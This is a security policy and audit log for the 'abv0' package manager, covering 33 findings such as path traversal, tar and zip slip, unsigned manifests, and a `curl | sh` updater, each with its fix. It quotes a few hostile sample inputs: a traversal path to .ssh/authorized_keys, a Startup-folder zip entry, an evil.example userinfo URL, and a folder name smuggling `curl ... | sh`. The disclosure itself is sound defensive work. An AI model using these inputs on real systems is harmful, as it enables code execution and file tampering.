# Security

## Reporting

Open an issue at <https://github.com/gugu8intel-i9/abv0/issues>, or run `abv0 report`
to open a prefilled one. If the issue is sensitive, mark it clearly at the top and omit
the exploit details until it is triaged.

## Threat model

`abv0` downloads and executes third-party binaries. Two inputs are treated as fully
hostile:

1. **The registry manifest** (`index.json`). It arrives over the network and controls
   package names, URLs, checksums and the paths written inside the store. It is now
   signed, and only a manifest whose signature verifies is used (finding 17).
2. **Downloaded archives.** Member names, symlink targets, sizes and content are all
   attacker-controlled if the manifest or the upstream host is compromised.
3. **GitHub release assets**, for `gh:` installs and for catalog sources. They are handled
   as downloaded archives. Their checksums come from GitHub or from the same release, not
   from the maintainer's signing key, except where the hash is in the signed catalog.

Everything derived from those inputs is validated before it reaches the filesystem or a
`exec` call.

Packages that `build-catalog discover` finds are chosen by rules, not by a person: at
least 500 stars, not a fork, mirror or archive, active, and at least six months old,
which makes fake stars costly. They go through the same pipeline as hand-written
sources: a pinned SHA-256 in the signed catalog, plus the malware scan both when the
catalog is built and when the package is installed. Trust in such a package rests on its
upstream project.

---

## Findings

Findings 1 to 13 were fixed in 2.0.0. Findings 14 to 26 were fixed in 2.5.0 and are listed in the 2.5.0 section of
[CHANGELOG.md](CHANGELOG.md). Findings 27 onward are in this file.

The audit covered the whole tree. Severities are the author's assessment for a user
running `abv0 install` against a compromised or malicious manifest.

### 1. Checksum mismatch did not stop an install — critical

`verifyChecksum` printed a warning on mismatch and installed the package anyway. The
code path was introduced as a "smart rolling release hash mismatch bypass", which
disabled integrity checking for every package, including ones with correct pinned
hashes.

**Fixed.** A mismatch is a hard failure: the archive is discarded, nothing is unpacked,
nothing is linked, and the process exits non-zero. A package with no pinned SHA-256 for
the requested platform is refused as well. `--allow-unverified` opts out for a single
invocation and prints an explicit warning when it does.

Verified: installing with a deliberately wrong hash aborts and leaves
`~/.abv0/bin` and `~/.abv0/store` empty.

### 2. Path traversal when extracting archives — critical

Two separate holes:

* `raw` extraction joined the manifest-supplied `bin_path` onto the store directory
  with no validation, so `"bin_path": "../../../../.ssh/authorized_keys"` wrote outside
  the store.
* Tar extraction did not validate member names, so a crafted archive could write
  anywhere the user could write (tar slip), and symlink members could point outside the
  extraction root so that a later member wrote through the link.

The v1.5.0 release notes claimed this was fixed. It was not.

**Fixed.** `src/safepath.zig` centralises validation. Every member name and every
manifest-supplied path must pass `isSafeRelPath`, which rejects `..` components,
absolute paths, Windows drive letters (`C:`), UNC prefixes (`\\`), backslash separators
and embedded NUL bytes. Symlink members additionally pass `symlinkStaysInside`, which
resolves the target relative to the link's own directory and rejects anything that
escapes. Zip extraction goes through `std.zip.extract`, which performs its own
rejection. Unit tests cover tar slip, absolute member names and symlink escape.

### 3. Uninitialized heap disclosure in the columnar registry — high

`ColumnarRegistry` read attacker-controlled `u16` lengths from the index file,
allocated that many bytes, and used the buffer without checking how many bytes were
actually read. A short file therefore exposed uninitialized heap memory as package
metadata. This was also claimed as fixed in v1.5.0 and was not.

**Fixed.** That code is gone; it had zero call sites. The replacement
(`src/abvindex.zig`) validates the magic, version and declared record count against the
real file size, bounds-checks every string-table offset and length against the mapping
before slicing, and rejects truncated, corrupt or out-of-range files. Tests cover each
of those rejections.

### 4. `abv0 update` was `curl | sh` — high

`update` shelled out to
`curl -sL https://raw.githubusercontent.com/.../install.sh | sh`, re-running a remote
installer as the invoking user on every update, with no verification of what was
fetched. Anyone able to influence that URL's content — including a compromised CDN
cache or an operator of a network path if the redirect chain were downgraded — got
arbitrary code execution.

**Fixed.** `update` now refreshes the registry index only. It downloads to a temporary
file, parses and validates it, and replaces the existing index only if the new one is
usable — so a corrupt download cannot brick the installation either. Upgrading the
`abv0` binary is a deliberate, separate action.

### 5. `curl` without `--fail`: error pages installed as binaries — high

Downloads ran `curl -sL -o` with no `--fail`, so an HTTP 404, a rate-limit body or a
captive-portal page was written to disk, checksummed (see finding 1: the mismatch was
ignored), marked executable and linked onto the user's `PATH`.

**Fixed.** All downloads use `--fail --proto '=https' --proto-redir '=https'` with
connect and total timeouts and bounded retries, so non-2xx responses are errors and a
redirect cannot downgrade to plaintext HTTP. As defence in depth, `looksLikeErrorPage`
sniffs the first bytes of every payload and rejects HTML/JSON where an archive was
expected.

### 6. Typosquat-to-RCE in dynamic installs — high

If a requested package was not in the registry, `installDynamic` searched the GitHub
API and installed the first repository whose name looked close enough, with no checksum
possible. A typo (`abv0 install ripgrpe`) or a name-similar repository published by an
attacker resulted in running their binary.

**Fixed.** Dynamic installation is opt-in behind `--allow-unverified`. Without it,
`abv0` explains why it is refusing. When enabled, the repository `full_name` is
validated, the URL is built with proper percent-encoding, only HTTPS asset URLs are
accepted, and the branch comes from the API's `default_branch` rather than a hardcoded
`refs/heads/master`.

### 7. Manifest fields were trusted verbatim — high

Package names, versions and `bin[]` entries from the manifest were used to build
filesystem paths and link names with no validation, so a hostile manifest could write
outside the store via the package *name* as well as via `bin_path`.

**Fixed.** `loadFromJsonFile` validates every record: names and versions must be safe
identifiers, `bin_path` and each `bin[]` entry must be a safe relative path, and every
URL must be HTTPS. Invalid packages are dropped individually — a single bad entry does
not deny service for the whole manifest — and the count of rejected packages is
available to the caller.

### 8. Denial of service via malformed manifests — medium

Parsing used `.?` on optional JSON lookups. A truncated manifest, an unexpected type, or
a GitHub rate-limit response (`{"message": "...", "documentation_url": "..."}`) panicked
the process.

**Fixed.** No unchecked unwraps remain on parsed input; every missing or wrongly typed
field produces a typed error. Tests feed the parser garbage bytes, truncated JSON, wrong
top-level types and rate-limit bodies.

### 9. Install lock was not a lock — medium

The "lock" wrote a text file and never took an OS lock, so two concurrent installs of
the same package interleaved their writes into the same store directory. A related race
let two processes starting on a fresh machine both write `index.json` in place, with one
reading the other's partial write.

**Fixed.** Installs take a real advisory file lock (`File.lock`/`unlock`) for the
duration. The manifest is published atomically: downloaded to a unique temporary name,
parsed, then renamed. Verified with 18 concurrent installs across fresh homes — zero
failures, correct result each time.

### 10. DMG images mounted without a private mount point — medium

macOS `.dmg` handling ran `hdiutil attach -nobrowse -readonly -quiet <image>` at the
default mount location and then copied from a volume it located under `/Volumes`
(finding 20). Without a mount point of its own, abv0 could not be sure which volume it
read from, and it did not pass `-noverify`, `-noautoopen` or `-mountpoint`.

**Corrected.** The text previously in this entry said 2.0.0 passed
`-readonly -nobrowse -noverify -noautoopen`, and that the image was mounted writable.
Neither was accurate. 2.0.0 passed `-readonly` and `-nobrowse` only, so the image was
already read-only.

**Fixed.** The call is now `hdiutil attach -readonly -nobrowse -noverify -noautoopen
-quiet -mountpoint <private directory> <image>`. The mount point is created by abv0,
copies come only from it, and it is always detached with the same path. Copy errors are
returned, not ignored.

### 11. A 0-byte binary was published as a release — medium

`release/abv0-darwin-x86_64` was 0 bytes, and `install.sh` would `chmod 0700` it and
report "installed successfully". `release/abv0-linux-x86_64` was an unstripped debug
build. The installer also ran `curl` without `--fail`, never checked a checksum, and
wrote directly to the destination path so an interrupted download left a truncated
binary on the user's `PATH`.

**Fixed.** All six release artifacts are rebuilt as stripped `ReleaseFast` binaries and
published with `release/SHA256SUMS`. The installer verifies the checksum, rejects empty
files and non-executable payloads, runs the binary once before publishing it, and moves
it into place atomically. Every failure path installs nothing.

### 12. Overly permissive store directories — low

Store directories were created with the default mode and then fixed up by spawning
`chmod` subprocesses, leaving a window in which they were world-readable, and failing
silently if `chmod` was not on `PATH`.

**Fixed.** Directories are created and tightened in-process with `fchmod` (`0700` for
the root, `0600` for state files), with no window and no subprocess. On Windows, where
POSIX mode bits do not exist, the calls compile away.

### 13. Unbounded resource use — low

One OS thread was spawned per requested package with no limit, and the bundle parser
read whole files into memory with `readToEndAlloc`.

**Fixed.** The worker pool is capped at `min(CPUs, packages, 8)`. The bundle parser
streams line by line with a bounded line length and skips over-long lines with a
warning.

### 14. Malicious and mock executables in the public registry — critical

The public registry carried `threat-sample`, a package whose binary was a script
containing malware patterns (the repository's `packages/malware_sample.sh`). It also
carried `git` and `wget` entries whose binaries were mock shell scripts
(`packages/git_mock.sh`, `packages/wget_mock.sh`). Installing either put a script named
`git` or `wget` on the user's `PATH` in place of the real tool, and the manifest gave it
the same trust as every other entry. Test-only `mock-gui` was also published.

**Fixed.** `threat-sample`, `git`, `wget` and `mock-gui` are removed from the manifest.
The fixtures moved to `tests/fixtures/`, whose README says they are never published.
They are used only by abv0's own tests. The manifest is signed (finding 17), so a later
change to these entries needs the maintainer's signature.

### 15. Symlink-chain escape during extraction — critical

Tar members were checked by link text only. A member `a/l -> ..` followed by a member
`p -> a/l/..` each passed the check, and then `p/x` was written outside the extraction
root through the chain.

**Fixed.** Before a member is written, every existing parent component of its path, and
the final component, is checked on disk. A symlink target may not walk through a link
that is already on disk. Setuid, setgid and sticky bits are masked off.

### 16. Packages could claim bin names owned by others — critical

Bin links were created by name in the bin directory, with no record of which package
owned each one. A package could claim a name owned by another installed package, or a
system command such as `sudo` or `ssh`, and nothing recorded which package the name
belonged to.

**Fixed.** Each bin link and app bundle is recorded with its owning package. A link owned
by another package is a conflict and is refused unless `--force` is given. Reserved names
are refused when the manifest is loaded: `abv0`, `sudo`, `su`, `doas`, `ssh`, `sh`,
`bash`, `zsh`, `fish` and others, compared case-insensitively. Installs from before this
change have links with no ownership record. They are adopted by the package that made
them, not refused.

### 17. Unsigned manifest, and the current directory's manifest was loaded — high

The manifest was trusted without any authenticity check. Whoever controlled the download
path (a mirror, a proxy, a compromised host) controlled every URL and checksum in it. A
separate problem: a `packages/index.json` in the current directory was loaded
automatically, so running `abv0` inside an untrusted checkout used that manifest. An old
signed manifest could also be served again, so a vulnerable version could be reinstalled.

**Fixed.** `update` and the first-run bootstrap download the manifest and `<url>.sig`,
verify an Ed25519 detached signature against `keys/manifest.pub` (compiled in;
`-Dmanifest-pubkey` overrides it at build time), and only then use the file. The
manifest's `updated_at` may not be older than the last one accepted, which is stored in
`<registry dir>/last-updated-at`. The current directory's manifest is no longer loaded.
`--registry <path>` loads a manifest that must have a verifying `<path>.sig`.
`--allow-unsigned-manifest` skips both checks, prints a warning, and is for testing only.
The root of trust is the maintainer's signing key, whose public half is
`keys/manifest.pub`; the secret half is held by the maintainer and the
`ABV0_MANIFEST_KEY` repository secret only. `release/SHA256SUMS.sig` is checked by
`self-update` in the same way.

### 18. Uninstall deleted app bundles by name — high

Uninstalling a package removed `<apps root>/<name>` for every name in the manifest's
`app_bundles`, whether or not abv0 had installed that bundle. A manifest name could
therefore delete an existing directory of that name under the apps root.

**Fixed.** App bundle names must end in `.app` and must be a single plain path
component, with no separators, drive colons or control bytes. Removal and replacement
apply only to bundles abv0 installed, which the ownership record shows. Any other
directory is left alone. A unit test checks that an existing `Other.app` survives.

### 19. Uninstall matched by prefix, and store names were ambiguous — high

Store directories were named `name-version-platform`. Uninstall matched store entries by
the prefix `name-`, so uninstalling `foo` also removed the store directories of a package
called `foo-tools`. Because `-` can appear in both names and versions, a store directory
name could not be split reliably into its parts.

**Fixed.** Store directories are named `name@version@platform`. `@` is not allowed in
names or versions, so the split is unambiguous. Uninstall compares the parsed name
exactly. Directories from the old naming scheme are still recognised, so their links are
adopted rather than refused, and the packages need one reinstall (see CHANGELOG.md).

### 20. DMG copy could read from a volume other than the image — medium

After attaching an image, the 2.0.0 code iterated `/Volumes` and copied from a volume it
found there, not from the mount point of the image it had just attached. A volume that
was already mounted could be read in place of the image.

**Fixed.** The image is attached at a private mount point that abv0 creates, and the
copy reads only from that path. See finding 10 for the flags.

### 21. Extraction had no size limit, curl read `~/.curlrc`, and userinfo URLs were accepted — medium

Extraction had no limit on total size or member count, so one hostile archive could fill
the disk or exhaust inodes. `curl` ran without `-q`, so it read `~/.curlrc` and applied
whatever options it contained to abv0's downloads. URLs with userinfo, such as
`https://host@evil.example`, were accepted, so the host a user reads in a URL could be
different from the host the request went to.

**Fixed.** tar and zip extraction stop at 4 GiB (`max_extract_bytes`) or 200,000 members
(`max_extract_members`). curl is started with `-q` first, so `~/.curlrc` is ignored.
Downloads are capped at 2 GiB (`--max-filesize`). URLs containing userinfo are rejected.

### 22. Binary index offsets could overflow, and the cache trusted size and mtime — medium

The binary index stored offsets and lengths as `u32`, and narrowed lengths with
`@intCast`. Outside the range of `u32`, an out-of-range `@intCast` is undefined behaviour
in ReleaseFast builds, so a large value could wrap. The index cache was reused when the
source file's size and mtime matched. An `index.json` replaced with the same size and an
old mtime could therefore be served from a stale cache.

**Fixed.** Narrowing and addition go through `toU32` and `addU32`, which return
`IndexTooLarge` instead of wrapping. The index format is version 2. The cache is keyed by
the SHA-256 of `index.json`, not by size and mtime.

### 23. Manifest text and JSON output were not escaped — medium

Names and descriptions from the manifest were printed to the terminal as they were, so a
control byte in one could move the cursor, overwrite earlier output, or change the
terminal title. JSON output did not escape string values with the standard encoder, so a
quote or backslash in a value could break the document.

**Fixed.** Control bytes in manifest-derived text are printed as `?`. Every JSON string
value goes through the standard encoder.

### 24. Crash log recovery and package publish were not crash-safe — medium

The write-ahead log did not fsync, did not recover a torn tail record, did not persist
its sequence counter across runs, and was never compacted. Publishing a package tree was
a single rename into place with no step to remove an existing tree first, so an
interrupted publish over an existing install could leave the store in a state recovery
did not expect.

**Fixed.** The log fsyncs each record, recovers a torn tail record, persists its sequence
number and compacts. A publish over an existing install moves the old tree aside, renames
the new tree in, and deletes the old one only after success. A unit test checks that only
the new tree remains.

### 25. Upgrade removed the installed version before installing the new one — medium

`upgrade` removed the installed version before the replacement was downloaded and
installed. A failed download or verification therefore left the package missing.

**Fixed.** `upgrade` installs the new version first. Older versions are pruned
(`Store.pruneOtherVersions`) only after that succeeds. `upgrade` exits 1 when every
requested name is unknown.

### 26. Installer issues — low

* `install.sh` wrote `export PATH="<bin dir>:$PATH"` into the shell profile without
  quoting. A bin directory containing `$(...)` or a backtick ran commands each time the
  profile loaded, and a newline in `ABV0_BIN_DIR` could add lines to the profile.
* When no SHA-256 tool was found, the installer warned and continued unverified.
* The installer ran `chmod 0700` on the parent of the bin directory, which could be a
  directory the user did not create.
* `install.ps1` allowed only TLS 1.2.

**Fixed.** The profile line uses POSIX single-quoting for the path. A newline in
`ABV0_BIN_DIR` is refused. A missing SHA-256 tool is an error unless
`ABV0_ALLOW_UNVERIFIED=1` is set. Only directories this run creates under the default
`~/.abv0` are made `0700`. `install.ps1` allows TLS 1.3 when the runtime supports it.

### 27. Zip entries with drive, UNC or stream names could be written outside the store — high

`std.zip.extract` rejects only a leading `/` and `..` components. A member named with
forward slashes and a drive letter, such as
`C:/Users/x/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.cmd`, passed
that check. On Windows, creating a file at a drive-absolute path ignores the destination
directory, so the file was written outside the store. Drive-relative names (`C:x`), UNC
names (`//server/share/x`) and NTFS alternate data streams (`a.exe:evil`) passed the same
check.

**Fixed.** `checkZipEntries` reads every entry name from the central directory before the
first write, at the same offset `std.zip.extract` reads it from. If any name is not a safe
relative path, or contains `:` or a backslash, the whole archive is refused with
`error.UnsafeArchiveMember`. `std.zip` cannot skip one member, so refusing the archive is
the only safe option. Tar members whose names contain `:` are skipped on Windows. Tests
build small stored zips in memory and check that unsafe names are refused with nothing
written, including when a safe member comes before the unsafe one.

### 28. A manifest already on disk was trusted without a check — high

A registry index that was already present was used without any check. A manifest placed
there by the installer, or by anything else that could write to the registry directory,
was never verified. The signature and replay checks from finding 17 ran only when abv0
downloaded the manifest itself.

**Fixed.** abv0 records the SHA-256 of the manifest it accepted in
`<registry>/index.json.sha256`, written atomically after the signature and replay checks
pass. A manifest on disk is trusted only if its hash matches that record. Otherwise, if
`index.json.sig` sits beside it, the signature and replay checks run as they do for a
download, and the hash is recorded on success. If there is no signature, or the check
fails, the manifest is downloaded again through the verified path. Nothing is deleted
first. The decision is the pure function `trustState`, and it has tests. `abv0 update`
also records the hash. The installers now download `index.json.sig` with the index.

### 29. A GitHub token appeared on the curl command line — medium

When `GITHUB_TOKEN` or `GH_TOKEN` is set, API requests for `gh:` installs send an
`Authorization: Bearer` header. When a request fell back to curl, `buildCurlArgv` passed each
header as a `--header` argument, so the token was readable from the process list while curl
ran.

**Fixed.** Header lines are written to a new private file (mode 0600, created exclusively)
beside the download, or in `<abv0 home>/tmp` (0700), and curl reads them with
`--header @<file>`. The file is removed when curl exits, whatever the outcome. Headers
containing CR, LF or NUL are refused before anything runs, and `buildCurlArgv` refuses to
build an argv for headers that have no file. Tests assert the token never appears in argv.

### 30. self-update could install an older release — medium

`self-update` (also run every night by `maintain` when `autoupdate` is on) accepted any
`SHA256SUMS` whose signature verified and installed whatever build it named. An old
`SHA256SUMS` keeps a valid signature forever, so whoever could serve old release files
(for example by reverting `release/` on `main`) could roll every user back to a version
with known holes.

**Fixed.** After the download is verified, the new binary's `--version` is read and the
update is refused when that version is older than the running one. Tested with a build
claiming 9.0.0: the published 2.6.0 is refused and the running binary is unchanged.

### 31. Workflows that hold the signing key ran actions by movable tag — medium

The Release and Catalog workflows read `ABV0_MANIFEST_KEY` and can push to `main`. They ran
`actions/checkout@v4`, `mlugg/setup-zig@v1` and others by tag. A tag can be moved, so a
compromised action repository could run new code in those jobs and take the key.

**Fixed.** Every `uses:` in every workflow is pinned to a full commit SHA, with the tag
kept as a comment.

### 32. Paths were written into scheduler jobs unchecked — low

`autoupdate on` writes the abv0 path, the log path, `ABV0_HOME` and `ABV0_BIN_DIR` into a
crontab line, a systemd unit, a launchd plist or a Task Scheduler command. A newline in one
of them would add a crontab line or a unit setting; `%` is a newline to cron and an
expansion to cmd; `"` ends a quoted word in the Task Scheduler command. The values come
from the user's own environment, so this is a robustness issue more than an attack.

**Fixed.** `autoupdate on` refuses any of those paths that holds a control character, `%`
or `"`, before anything is written.

### 33. The `brew uninstall` hint could carry shell syntax — low

After `migrate --install`, abv0 prints a `brew uninstall ...` line to paste into a shell.
Names come from folder names in the Homebrew Cellar, and a name matched without its
`@version` suffix kept the suffix in the line, so a folder such as
`jq@;curl$IFS-s$IFS//x|sh` would have been printed as part of that command.

**Fixed.** Only names made of letters, digits and `@._+-` go into the line; any other is
left out.

## Hardening summary

| Area | Control |
| :--- | :--- |
| Transport | Built-in HTTPS client (`std.http`, TLS 1.3, connections reused within a run). curl is a fallback for transport failures only, under the same HTTPS-only policy: `https` on every redirect hop, `-q` so `~/.curlrc` is ignored, `--fail`, bounded timeouts and retries, 2 GiB download cap, userinfo URLs rejected. A host that fails is remembered for 24 hours. In the built-in client, API headers go only to the original host; see finding 29 for the curl fallback. |
| Integrity | SHA-256 enforced by default; `gh:` installs are checked against GitHub's digest or the release's checksum file; an asset with neither is refused unless explicitly allowed; streamed bytes are published only after the digest matches |
| Signing | Ed25519 detached signature on the manifest, checked before it is read; a manifest on disk is trusted only if its SHA-256 matches the recorded one; `updated_at` replay check; `release/SHA256SUMS.sig` checked by `self-update`, which never installs an older version |
| Extraction | Member-name validation, every existing parent checked on disk, symlink targets may not walk through links, no absolute or `..` paths, no drive letters or UNC, zip names checked before the first write, 7z names and CRCs checked, 4 GiB and 200,000 member caps, setuid, setgid and sticky bits cleared |
| Ownership | Bin links and app bundles recorded with their owning package; conflicts refused unless `--force`; reserved names refused; exact name match on uninstall; app bundles must end in `.app` |
| Manifest | Per-record validation, invalid records dropped, duplicate and reserved names rejected, no panics on malformed input |
| Concurrency | Real advisory file locks, atomic temp-file-plus-rename publishes, WAL with fsync and torn-tail recovery, install-first upgrades |
| Filesystem | `0700` store root, `0600` state files, set in-process without subprocesses; DMG attached at a private mount point |
| Binary index | Magic, version, size and every offset bounds-checked before dereference; `u32` overflow fails; cache keyed by SHA-256 |
| Output | Manifest-derived text printed with control bytes replaced; JSON through the standard encoder |
| Releases | Stripped release builds, published `SHA256SUMS`, installer verifies before publishing |
| Workflows | Every action pinned to a commit SHA; the signing key is written to a 0600 file only for the signing step and removed after it |
| Catalog | Self-building: `packages/index.json` is generated from `catalog/sources.txt` and upstream releases; refuses to write when most sources fail or the catalog would lose more than half its packages; output must load with zero rejected packages; signed daily with `ABV0_MANIFEST_KEY` and checked before it is committed |

## Non-goals

`abv0` does not verify code signatures or provenance attestations for upstream
artifacts. It verifies that the bytes you received match the SHA-256 that the maintainer
pinned in the manifest, and the manifest is signed with Ed25519 against `keys/manifest.pub`.

The root of trust is therefore the maintainer's signing key. If that key is stolen, an
attacker can sign a manifest that points at malicious archives with matching hashes. The
secret key must stay out of git and off shared machines.

For catalog packages, the expected SHA-256 is part of the signed `packages/index.json`, so
it is covered by the signature. A direct `gh:` install is not in that index. Its expected
hash is GitHub's digest for the asset, or a checksum file in the same release, and the
maintainer's key covers neither. Trust in a direct `gh:` install therefore rests on the
upstream project and on GitHub.
